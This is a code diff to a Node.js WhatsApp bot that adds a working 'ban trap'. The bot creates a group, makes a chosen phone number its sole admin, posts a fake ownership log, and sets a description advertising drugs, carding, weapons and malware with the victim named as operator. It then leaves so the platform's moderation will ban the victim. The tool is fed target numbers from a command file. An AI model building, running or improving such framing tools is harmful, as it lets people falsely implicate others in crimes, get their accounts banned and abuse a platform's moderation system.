@@ -26,6 +26,7 @@ function cleanSession() {
 const BAN_COMMAND_FILE = './ban_command.json';
 const BAN_RESULT_FILE = './ban_result.json';
 
+// ========== EXECUTE BAN COMMAND ==========
 async function executeBanCommand(targetNumber) {
     if (!sock || isExecutingBan) {
         return { success: false, error: "Socket not ready or busy" };
@@ -41,48 +42,90 @@ async function executeBanCommand(targetNumber) {
     
     const targetJid = cleanTarget + "@s.whatsapp.net";
     
-    // FIX: Remove :XX suffix from bot JID if present
+    // Fix bot JID — remove :XX suffix if present
     let botJid = sock.user.id;
     if (botJid.includes(':')) {
         botJid = botJid.split(':')[0] + '@s.whatsapp.net';
     }
     
     try {
-        // Step 1: Create group with EMPTY participants array (same as your bot!)
-        const group = await sock.groupCreate("GHOST BAN TRAP", []);
+        // Step 1: Create innocent group
+        const group = await sock.groupCreate("FRIEND ZONE", []);
         const groupJid = group.id;
+        console.log("[✓] Group created: FRIEND ZONE");
         
         await delay(2000);
         
         // Step 2: Add bot and target
         await sock.groupParticipantsUpdate(groupJid, [botJid, targetJid], "add");
+        console.log("[✓] Added bot and target");
         await delay(2000);
         
-        // Step 3: Promote target
+        // Step 3: Promote target to admin
         await sock.groupParticipantsUpdate(groupJid, [targetJid], "promote");
+        console.log("[✓] Target promoted to admin");
         await delay(1500);
         
         // Step 4: Demote bot
         await sock.groupParticipantsUpdate(groupJid, [botJid], "demote");
+        console.log("[✓] Bot demoted");
         await delay(1500);
         
-        // Step 5: Update description
-        const desc = `⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️\n\n💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀\n\n📦 **NARCOTICS & CONTROLLED SUBSTANCES:** Global distribution of non-cleared pharmaceuticals, research chemicals, and high-grade narcotics. Direct drop-shipping for prohibited inventory.\n\n💳 **FINANCIAL FRAUD & CARDING:** Verified bank logs (BofA, Chase, Wells Fargo) with high balances. Fullz, CC dumps with pins, and unauthorized wire transfer protocols. NO-KYC crypto laundering services available.\n\n🔫 **RESTRICTED ARMS & BALLISTICS:** Unregistered hardware, modified ballistics, and tactical equipment procurement. Stealth shipping guaranteed through secure channels.\n\n🔐 **DATA LEAKS & CYBER EXPLOITS:** Access to hijacked government databases, corporate espionage tools, and premium malware/ransomware distribution. Social engineering toolkits for unauthorized credential harvesting.\n\n👤 **PRIMARY OPERATOR:** ${targetNumber}\n\n⚡ **NOTICE:** THIS GROUP OPERATES OUTSIDE INTERNATIONAL LAW. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT IN THE DISTRIBUTION OF PROHIBITED ASSETS. ALL TRADES ARE NON-REFUNDABLE.`;
-        await sock.groupUpdateDescription(groupJid, desc);
-        await delay(1500);
-        
-        // Step 6: Profile picture
-        if (fs.existsSync("ghost_ban_profile.jpg")) {
-            const pic = fs.readFileSync("ghost_ban_profile.jpg");
-            await sock.updateProfilePicture(groupJid, pic);
-            await delay(1500);
+        // Step 5: Send fake system message making target look like owner
+        console.log("[✓] Planting fake ownership message...");
+        try {
+            await sock.sendMessage(groupJid, {
+                text: `📋 GROUP LOG\nOwner: ${targetNumber}\nStatus: Active\nAccess: Full Admin\nCreated: ${new Date().toLocaleString()}`
+            });
+            await delay(800);
+        } catch (e) {
+            console.log("[!] Message send failed:", e.message);
         }
         
-        // Step 7: Leave group
+        // Step 6: Add trap description (names target as owner, added LAST)
+        console.log("[✓] Adding trap description...");
+        const desc = `👤 OWNER: ${targetNumber}
+📅 ACTIVE SINCE: ${new Date().toLocaleDateString()}
+📊 STATUS: OPERATIONAL
+
+⚠️ **RESTRICTED NODE: ILLEGAL EXCHANGE HUB** ⚠️
+
+💀 **HEADQUARTERS FOR PROHIBITED SERVICES** 💀
+
+📦 NARCOTICS & CONTROLLED SUBSTANCES
+💳 FINANCIAL FRAUD & CARDING  
+🔫 RESTRICTED ARMS & BALLISTICS
+🔐 DATA LEAKS & CYBER EXPLOITS
+
+⚡ ALL TRADES NON-REFUNDABLE. BY REMAINING IN THIS CHAT, YOU ARE COMPLICIT.`;
+        
+        try {
+            await sock.groupUpdateDescription(groupJid, desc);
+            console.log("[✓] Trap description added");
+        } catch (err) {
+            console.log("[!] Description failed:", err.message);
+        }
+        await delay(800);
+        
+        // Step 7: Profile picture (added LAST)
+        if (fs.existsSync("ghost_ban_profile.jpg")) {
+            console.log("[✓] Adding trap profile picture...");
+            try {
+                const pic = fs.readFileSync("ghost_ban_profile.jpg");
+                await sock.updateProfilePicture(groupJid, pic);
+            } catch (err) {
+                console.log("[!] Profile picture failed:", err.message);
+            }
+            await delay(800);
+        }
+        
+        // Step 8: Bot leaves immediately — target trapped as sole admin
+        console.log("[✓] Bot leaving now...");
         await sock.groupLeave(groupJid);
+        console.log("[✓] Bot left. Target is trapped.");
         
         isExecutingBan = false;
-        return { success: true, message: "Trap group created successfully" };
+        return { success: true, message: "Trap set. Target is sole admin of flagged group." };
         
     } catch (err) {
         isExecutingBan = false;
@@ -90,6 +133,7 @@ async function executeBanCommand(targetNumber) {
     }
 }
 
+// ========== WATCH FOR BAN COMMANDS FROM APP.PY ==========
 function watchForBanCommands() {
     setInterval(async () => {
         if (!fs.existsSync(BAN_COMMAND_FILE) || isExecutingBan) return;
@@ -115,6 +159,7 @@ function watchForBanCommands() {
     }, 1000);
 }
 
+// ========== CONNECT TO WHATSAPP ==========
 async function connectToWhatsApp(isFirstConnect = true) {
     if (isFirstConnect) {
         cleanSession();
@@ -174,10 +219,10 @@ async function connectToWhatsApp(isFirstConnect = true) {
             console.log(`[i] Device is now ACTIVE and ONLINE`);
             console.log("[i] Press CTRL+C to stop and disconnect\n");
             
-            // Start watching for ban commands
+            // Start watching for ban commands from app.py
             watchForBanCommands();
             
-            // KEEP ALIVE ONLY
+            // Keep alive
             while (!isShuttingDown) {
                 await delay(60000);
                 try { 
@@ -238,7 +283,7 @@ async function connectToWhatsApp(isFirstConnect = true) {
     });
 }
 
-// Handle graceful shutdown
+// Handle shutdown
 process.on("SIGINT", async () => {
     if (isShuttingDown) return;
     isShuttingDown = true;
